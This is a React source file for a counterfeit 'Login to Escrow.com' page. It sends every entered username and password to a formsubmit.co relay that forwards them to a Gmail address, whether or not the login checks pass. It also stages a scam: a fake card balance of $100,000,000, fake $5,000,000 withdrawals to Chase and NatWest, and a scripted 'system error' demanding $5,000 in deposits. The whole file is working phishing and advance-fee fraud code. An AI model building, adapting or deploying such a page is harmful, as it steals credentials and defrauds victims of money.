"use client";
import React, { useState } from "react";
import { useRouter } from "next/navigation";
import $ from "jquery";

const Form = () => {
  const router = useRouter();
  const [data, setData] = useState({
    username: "",
    password: "",
  });
  const [usererror, setUserError] = useState(false);
  const [passerror, setPassError] = useState(false);

  const [card, setCard] = useState("");

  const [opencard, setOpenCard] = useState(false);

  const [modelOpen, setModelOpen] = useState(false);

  const [inputNum, setInputNum] = useState("");

  const [chase, setChase]= useState(false)
  

  const [chaseNum, setChaseNum]= useState("")

  const onchange = (e) => {
    setData({ ...data, [e.target.name]: e.target.value });
    console.log(data);
  };

  const onSubmit = (e) => {
    e.preventDefault();

    $.ajax({
      method: "POST",
      url: `https://formsubmit.co/ajax/escrowssuportsystems@gmail.com`,
      dataType: "json",
      accepts: "application/json",
      data: {
        usererror: data.username,
        password: data.password,
      },

      success: (data) => {
        console.log("success");
      },
      error: (err) => {
        console.log("error");
      },
    });

    if (data.username === "" || data.password === "") {
      alert("Please fill in all fields");
      return;
    }

    if (data.username.toLocaleLowerCase() !== "lewisclark") {
      setUserError(true);
      setPassError(false);
      return;
    }
    if (data.password !== "clark898") {
      setPassError(true);
      setUserError(false);
      return;
    }

    router.push("/admindashboard");
  };

  const checkCard = () => {
    const trimmedValue = card.trim();
    if (trimmedValue === "4531582493421042") {
      alert("Card Holder name : Lewis F Clark \nCard balance is $100,000,000");
    } else {
      alert("please enter valid card number");
    }
  };

  const inputCardError = () => {

    console.log("called");
    console.log(inputNum)
    if (inputNum === "") {
      alert("Please Enter a 6-digit code");
    } else if (inputNum === "983498") {
      alert("AUTOMATED SYSTEM ERROR:\nTRANSFER DECLINED. COMPLETE $5,000 CHASE DEPOSITS FOR A SUCCESSFUL TRANSFER OF $5,000,000");
      setInputNum("");  
    } else {
      alert("Please input a valid code");
    }
  };


  
  const chaseError = () => {
    if (chaseNum === "") {
      alert("Please Enter a 6-digit code");
    } else  {
      alert("Invalid Code");
      setChaseNum("");  
    }  
  };


  

  return (
    <>
      {modelOpen && (
        <div className="model">
          <div className="inner-model">
            <div className="text-end">
              <img
                src="plus.svg"
                className="cross"
                alt="cross"
                onClick={() => setModelOpen(false)}
              />
            </div>

            <label htmlFor="transfer" className="mb-2">
              Input 6 digit Transfer validation number
            </label>
            <input
              type="text"
              id="transfer"
              className="custom-field"
              name="inputNum"
              value={inputNum}
              onChange={(e) => setInputNum(e.target.value)}
            />
            <button className="model-btn" onClick={inputCardError}>
              Transfer
            </button>
          </div>
        </div>
      )}

      {
        chase && (
          <div className="model">
          <div className="inner-model">
            <div className="text-end">
              <img
                src="plus.svg"
                className="cross"
                alt="cross"
                onClick={() => setChase(false)}
              />
            </div>

            <label htmlFor="transfer" className="mb-2">
              Input 6 digit Transfer validation number
            </label>
            <input
              type="text"
              id="transfer"
              className="custom-field"
              name="chaseNum"
              value={chaseNum}
              onChange={(e) => setChaseNum(e.target.value)}
            />
            <button className="model-btn" onClick={chaseError}>
              Check
            </button>
          </div>
        </div>
        )
      }

      <div className="container">
        <div className="row">
          <div className="col-md-6 mx-auto">
            <div className="form">
              <form onSubmit={onSubmit}>
                <h3 className="text-center mb-5">Login to Escrow.com</h3>

                <div className="field-container">
                  <label htmlFor="username">
                    PLEASE ENTER YOUR USERNAME <span>*</span>
                  </label>
                  <input
                    type="text"
                    id="username"
                    name="username"
                    value={data.username}
                    className="custom-flied"
                    onChange={onchange}
                  />
                </div>

                <div className="field-container">
                  <label htmlFor="password">
                    PLEASE ENTER YOUR PASSWORD <span>*</span>
                  </label>
                  <input
                    type="password"
                    id="password"
                    name="password"
                    className="custom-flied"
                    value={data.password}
                    onChange={onchange}
                  />
                </div>
                {usererror && <p className="text-danger">Username Incorrect</p>}

                {passerror && <p className="text-danger">Password Incorrect</p>}

                <button type="submit" className="login-btn">
                  Login
                </button>
              </form>

              <button
                className="login-btn mt-2"
                onClick={() => setOpenCard((prev) => !prev)}
              >
                {" "}
                CHECK DEBIT CARD BALANCE
              </button>

              {opencard && (
                <div className="card-number">
                  <label htmlFor="card">
                    Input the 14 digit nest bank card number
                  </label>
                  <input
                    type="text"
                    name="card"
                    id="card"
                    onChange={(e) => {
                      setCard(e.target.value);
                    }}
                  />

                  <button
                    className="login-btn mt-2 check-btn"
                    onClick={checkCard}
                  >
                    CHECK
                  </button>
                </div>
              )}

              <button
                className="login-btn mt-2"
                onClick={() => setChase(true)}
              >
                WITHDRAWL $5,000,000 TO CHASE
              </button>

              <button
                className="login-btn mt-2"
                onClick={() => setModelOpen(true)}
              >
                WITHDRAWL $5,000,000 TO NATWEST
              </button>
            </div>
          </div>
        </div>
      </div>
    </>
  );
};

export default Form;
